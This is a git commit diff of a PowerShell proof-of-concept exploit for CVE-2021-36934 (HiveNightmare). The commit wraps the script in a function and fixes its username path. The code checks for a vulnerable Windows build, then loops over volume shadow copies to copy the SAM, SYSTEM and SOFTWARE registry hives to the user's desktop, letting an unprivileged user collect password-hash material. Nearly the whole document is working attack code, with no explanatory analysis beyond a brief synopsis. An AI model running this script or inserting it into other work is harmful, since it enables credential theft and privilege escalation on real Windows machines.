69db4c115457e85b2c4c8efcc1949ecc4ce53b1e
ChoI <36252854+ChoiSG@users.noreply.github.com>
2021-11-30 20:15:23 -0600

    Update Invoke-HiveNightmare.ps1

--- Invoke-HiveNightmare.ps1
+++ Invoke-HiveNightmare.ps1
@@ -1,4 +1,5 @@
-<#
+function Invoke-HiveNightmare{
+    <#
     .SYNOPSIS
         PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, Security, and Software Registry hives in Windows 10 version 1809 or newer. 
 
@@ -22,49 +23,52 @@
         Version        : v.0.2
         Author         : @WiredPulse
         Created        : 21 Jul 21
-#>
+    #>
 
-[CmdletBinding()]
-param(
-       $path = "C:\Users\$username\Desktop"
-)
+    [CmdletBinding()]
+    param(
+           $path = "C:\Users\$($env:UserName)\Desktop"
+    )
 
-$outSam = "$path\Sam.hive"
-$outSoft = "$path\Soft.hive"
-$outSys = "$path\Sys.hive"
+    $outSam = "$path\Sam.hive"
+    $outSoft = "$path\Soft.hive"
+    $outSys = "$path\Sys.hive"
 
-if(-not(test-path $path)){
-    new-item $path -ItemType Directory | out-null
-}
-
-if(([environment]::OSVersion.Version).build -lt 17763){
-    Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"
-    pause
-    break
-}
-else{
-    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
-}
-
-for($i = 1; $i -le 9; $i++){
-    try{
-        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
-        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
-    } catch{}
-    try{
-        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\software"), ($outSoft + $i))
-        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SOFTWARE$i hive..."
+    if(-not(test-path $path)){
+        new-item $path -ItemType Directory | out-null
     }
-    catch{}
-    try{
-        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\system"), ($outSys + $i))
-        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SYSTEM$i hive..."
+
+    if(([environment]::OSVersion.Version).build -lt 17763){
+        Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"
+        pause
+        break
     }
-    catch{}
+    else{
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
+    }
+
+    for($i = 1; $i -le 9; $i++){
+        try{
+            [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
+            Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
+        } catch{}
+        try{
+            [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\software"), ($outSoft + $i))
+            Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SOFTWARE$i hive..."
+        }
+        catch{}
+        try{
+            [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\system"), ($outSys + $i))
+            Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SYSTEM$i hive..."
+        }
+        catch{}
+    }
+    if(test-path $path\s*.hive*){
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Hives are dumped to $path"
+    }
+    else{
+        Write-Host -ForegroundColor red "[-] There are no Volume Shadow Copies on this system"
+    }
+
 }
-if(test-path $path\s*.hive*){
-    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Hives are dumped to $path"
-}
-else{
-    Write-Host -ForegroundColor red "[-] There are no Volume Shadow Copies on this system"
-}
+
